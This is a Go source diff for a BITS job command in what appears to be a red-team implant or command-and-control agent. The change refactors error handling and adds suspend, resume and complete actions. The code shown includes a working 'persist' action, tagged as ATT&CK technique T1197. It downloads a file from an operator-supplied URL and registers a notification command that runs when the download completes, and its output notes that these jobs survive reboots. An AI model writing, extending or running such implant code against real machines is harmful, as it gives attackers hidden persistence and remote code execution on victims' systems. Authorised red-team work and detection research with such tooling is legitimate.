@@ -22,7 +22,7 @@ func (c *BitsCommand) Name() string {
 }
 
 func (c *BitsCommand) Description() string {
-	return "Manage BITS transfer jobs for persistence and file download (T1197)"
+	return "Manage BITS transfer jobs — list, create, persist, cancel, suspend, resume, complete (T1197)"
 }
 
 type bitsArgs struct {
@@ -104,11 +104,7 @@ type bgJobProgress struct {
 func (c *BitsCommand) Execute(task structs.Task) structs.CommandResult {
 	var args bitsArgs
 	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error parsing parameters: %v", err)
 	}
 
 	if args.Action == "" {
@@ -124,12 +120,14 @@ func (c *BitsCommand) Execute(task structs.Task) structs.CommandResult {
 		return bitsPersist(args)
 	case "cancel":
 		return bitsCancel(args)
+	case "suspend":
+		return bitsJobAction(args, bitsJobVtSuspend, "Suspended")
+	case "resume":
+		return bitsJobAction(args, bitsJobVtResume, "Resumed")
+	case "complete":
+		return bitsJobAction(args, bitsJobVtComplete, "Completed")
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s (use: list, create, persist, cancel)", args.Action),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Unknown action: %s (use: list, create, persist, cancel, suspend, resume, complete)", args.Action)
 	}
 }
 
@@ -192,11 +190,7 @@ type bitsJobEntry struct {
 func bitsList() structs.CommandResult {
 	mgr, cleanup, err := bitsConnect()
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error connecting to BITS: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error connecting to BITS: %v", err)
 	}
 	defer cleanup()
 
@@ -206,11 +200,7 @@ func bitsList() structs.CommandResult {
 	if _, err := bitsComCall(mgr, bitsVtEnumJobs, 0, uintptr(unsafe.Pointer(&pEnum))); err != nil {
 		// Try with all-users flag (requires elevation)
 		if _, err2 := bitsComCall(mgr, bitsVtEnumJobs, 1, uintptr(unsafe.Pointer(&pEnum))); err2 != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error enumerating BITS jobs: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error enumerating BITS jobs: %v", err)
 		}
 	}
 	defer bitsComCall(pEnum, 2) // Release
@@ -272,45 +262,25 @@ func bitsList() structs.CommandResult {
 	}
 
 	if len(entries) == 0 {
-		return structs.CommandResult{
-			Output:    "[]",
-			Status:    "success",
-			Completed: true,
-		}
+		return successResult("[]")
 	}
 
 	data, err := json.Marshal(entries)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error marshaling results: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error marshaling results: %v", err)
 	}
 
-	return structs.CommandResult{
-		Output:    string(data),
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(string(data))
 }
 
 func bitsCreate(args bitsArgs) structs.CommandResult {
 	if args.Name == "" || args.URL == "" || args.Path == "" {
-		return structs.CommandResult{
-			Output:    "Error: name, url, and path are required for create action",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: name, url, and path are required for create action")
 	}
 
 	mgr, cleanup, err := bitsConnect()
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error connecting to BITS: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error connecting to BITS: %v", err)
 	}
 	defer cleanup()
 
@@ -325,11 +295,7 @@ func bitsCreate(args bitsArgs) structs.CommandResult {
 		uintptr(unsafe.Pointer(&jobGUID)),
 		uintptr(unsafe.Pointer(&pJob)),
 	); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error creating BITS job: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error creating BITS job: %v", err)
 	}
 	defer bitsComCall(pJob, 2) // Release
 
@@ -342,20 +308,12 @@ func bitsCreate(args bitsArgs) structs.CommandResult {
 		uintptr(unsafe.Pointer(pathPtr)),
 	); err != nil {
 		bitsComCall(pJob, bitsJobVtCancel)
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error adding file to BITS job: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error adding file to BITS job: %v", err)
 	}
 
 	// Resume (start the download)
 	if _, err := bitsComCall(pJob, bitsJobVtResume); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error resuming BITS job: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error resuming BITS job: %v", err)
 	}
 
 	jobID := fmt.Sprintf("{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
@@ -363,35 +321,23 @@ func bitsCreate(args bitsArgs) structs.CommandResult {
 		jobGUID.Data4[0], jobGUID.Data4[1], jobGUID.Data4[2], jobGUID.Data4[3],
 		jobGUID.Data4[4], jobGUID.Data4[5], jobGUID.Data4[6], jobGUID.Data4[7])
 
-	return structs.CommandResult{
-		Output: fmt.Sprintf("[*] BITS Download Job Created (T1197)\n"+
+	return successf("[*] BITS Download Job Created (T1197)\n"+
 			"[+] Job Name: %s\n"+
 			"[+] Job ID:   %s\n"+
 			"[+] URL:      %s\n"+
 			"[+] Path:     %s\n"+
 			"[+] Status:   Downloading\n",
-			args.Name, jobID, args.URL, args.Path),
-		Status:    "success",
-		Completed: true,
-	}
+			args.Name, jobID, args.URL, args.Path)
 }
 
 func bitsPersist(args bitsArgs) structs.CommandResult {
 	if args.Name == "" || args.URL == "" || args.Path == "" || args.Command == "" {
-		return structs.CommandResult{
-			Output:    "Error: name, url, path, and command are required for persist action",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: name, url, path, and command are required for persist action")
 	}
 
 	mgr, cleanup, err := bitsConnect()
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error connecting to BITS: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error connecting to BITS: %v", err)
 	}
 	defer cleanup()
 
@@ -406,11 +352,7 @@ func bitsPersist(args bitsArgs) structs.CommandResult {
 		uintptr(unsafe.Pointer(&jobGUID)),
 		uintptr(unsafe.Pointer(&pJob)),
 	); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error creating BITS job: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error creating BITS job: %v", err)
 	}
 	defer bitsComCall(pJob, 2) // Release
 
@@ -423,11 +365,7 @@ func bitsPersist(args bitsArgs) structs.CommandResult {
 		uintptr(unsafe.Pointer(pathPtr)),
 	); err != nil {
 		bitsComCall(pJob, bitsJobVtCancel)
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error adding file to BITS job: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error adding file to BITS job: %v", err)
 	}
 
 	// QueryInterface for IBackgroundCopyJob2
@@ -437,11 +375,7 @@ func bitsPersist(args bitsArgs) structs.CommandResult {
 		uintptr(unsafe.Pointer(&pJob2)),
 	); err != nil {
 		bitsComCall(pJob, bitsJobVtCancel)
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error getting IBackgroundCopyJob2 (BITS 1.5+ required): %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error getting IBackgroundCopyJob2 (BITS 1.5+ required): %v", err)
 	}
 	defer bitsComCall(pJob2, 2) // Release
 
@@ -457,11 +391,7 @@ func bitsPersist(args bitsArgs) structs.CommandResult {
 		uintptr(unsafe.Pointer(paramsPtr)),
 	); err != nil {
 		bitsComCall(pJob, bitsJobVtCancel)
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error setting notification command: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error setting notification command: %v", err)
 	}
 
 	// SetNotifyFlags (BG_NOTIFY_JOB_TRANSFERRED | BG_NOTIFY_JOB_ERROR)
@@ -469,11 +399,7 @@ func bitsPersist(args bitsArgs) structs.CommandResult {
 
 	// Resume
 	if _, err := bitsComCall(pJob, bitsJobVtResume); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error resuming BITS job: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error resuming BITS job: %v", err)
 	}
 
 	jobID := fmt.Sprintf("{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
@@ -486,49 +412,33 @@ func bitsPersist(args bitsArgs) structs.CommandResult {
 		cmdLine += " " + args.CmdArgs
 	}
 
-	return structs.CommandResult{
-		Output: fmt.Sprintf("[*] BITS Persistence Job Created (T1197)\n"+
-			"[+] Job Name:    %s\n"+
-			"[+] Job ID:      %s\n"+
-			"[+] URL:         %s\n"+
-			"[+] Local Path:  %s\n"+
-			"[+] Notify Cmd:  %s\n"+
-			"[+] Status:      Downloading (command runs on completion)\n"+
-			"\n[!] The notification command will execute when the download completes.\n"+
-			"[!] BITS jobs survive reboots and run as the creating user.\n",
-			args.Name, jobID, args.URL, args.Path, cmdLine),
-		Status:    "success",
-		Completed: true,
-	}
+	return successf("[*] BITS Persistence Job Created (T1197)\n"+
+		"[+] Job Name:    %s\n"+
+		"[+] Job ID:      %s\n"+
+		"[+] URL:         %s\n"+
+		"[+] Local Path:  %s\n"+
+		"[+] Notify Cmd:  %s\n"+
+		"[+] Status:      Downloading (command runs on completion)\n"+
+		"\n[!] The notification command will execute when the download completes.\n"+
+		"[!] BITS jobs survive reboots and run as the creating user.\n",
+		args.Name, jobID, args.URL, args.Path, cmdLine)
 }
 
 func bitsCancel(args bitsArgs) structs.CommandResult {
 	if args.Name == "" {
-		return structs.CommandResult{
-			Output:    "Error: name is required for cancel action (use 'list' to find job names)",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: name is required for cancel action (use 'list' to find job names)")
 	}
 
 	mgr, cleanup, err := bitsConnect()
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error connecting to BITS: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error connecting to BITS: %v", err)
 	}
 	defer cleanup()
 
 	// Enumerate jobs to find by name
 	var pEnum uintptr
 	if _, err := bitsComCall(mgr, bitsVtEnumJobs, 0, uintptr(unsafe.Pointer(&pEnum))); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error enumerating BITS jobs: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error enumerating BITS jobs: %v", err)
 	}
 	defer bitsComCall(pEnum, 2)
 
@@ -561,18 +471,63 @@ func bitsCancel(args bitsArgs) structs.CommandResult {
 	}
 
 	if cancelled == 0 {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("No BITS job found with name: %s", args.Name),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("No BITS job found with name: %s", args.Name)
 	}
 
-	return structs.CommandResult{
-		Output:    fmt.Sprintf("[+] Cancelled %d BITS job(s) named: %s", cancelled, args.Name),
-		Status:    "success",
-		Completed: true,
+	return successf("[+] Cancelled %d BITS job(s) named: %s", cancelled, args.Name)
+}
+
+// bitsJobAction performs a vtable action (suspend/resume/complete) on a BITS job by name.
+func bitsJobAction(args bitsArgs, vtableIndex int, actionLabel string) structs.CommandResult {
+	if args.Name == "" {
+		return errorf("Error: name is required for %s action (use 'list' to find job names)", strings.ToLower(actionLabel))
 	}
+
+	mgr, cleanup, err := bitsConnect()
+	if err != nil {
+		return errorf("Error connecting to BITS: %v", err)
+	}
+	defer cleanup()
+
+	var pEnum uintptr
+	if _, err := bitsComCall(mgr, bitsVtEnumJobs, 0, uintptr(unsafe.Pointer(&pEnum))); err != nil {
+		return errorf("Error enumerating BITS jobs: %v", err)
+	}
+	defer bitsComCall(pEnum, 2)
+
+	var count uint32
+	bitsComCall(pEnum, bitsEnumVtGetCount, uintptr(unsafe.Pointer(&count)))
+
+	acted := 0
+	for i := uint32(0); i < count; i++ {
+		var pJob uintptr
+		var fetched uint32
+		hr, _ := bitsComCall(pEnum, bitsEnumVtNext, 1, uintptr(unsafe.Pointer(&pJob)), uintptr(unsafe.Pointer(&fetched)))
+		if int32(hr) < 0 || fetched == 0 {
+			break
+		}
+
+		var namePtr uintptr
+		bitsComCall(pJob, bitsJobVtGetDisplayName, uintptr(unsafe.Pointer(&namePtr)))
+		name := ""
+		if namePtr != 0 {
+			name = bitsReadWString(namePtr)
+			bitsCoTaskMemFree(namePtr)
+		}
+
+		if strings.EqualFold(name, args.Name) {
+			bitsComCall(pJob, vtableIndex)
+			acted++
+		}
+
+		bitsComCall(pJob, 2)
+	}
+
+	if acted == 0 {
+		return errorf("No BITS job found with name: %s", args.Name)
+	}
+
+	return successf("[+] %s %d BITS job(s) named: %s", actionLabel, acted, args.Name)
 }
 
 // Helper functions
